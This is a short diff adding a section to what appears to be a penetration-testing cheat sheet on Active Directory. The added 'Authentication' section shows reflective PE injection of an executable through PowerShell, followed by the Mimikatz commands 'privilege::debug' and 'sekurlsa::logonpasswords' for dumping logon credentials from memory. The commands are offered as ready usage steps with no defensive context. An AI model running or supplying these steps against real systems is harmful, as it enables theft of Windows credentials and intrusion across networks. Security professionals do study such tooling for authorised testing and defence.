@@ -91,3 +91,12 @@ Foreach($obj in $Result)
     $obj.Properties.name / $obj.Properties.member
 }
 ```
+### Authentication
+###### Minikatz(require local admin)
+Load DemoEXE and run it locally.  
+$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')  
+Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"
+```
+1. privilege::debug
+2. sekurlsa::logonpasswords
+```
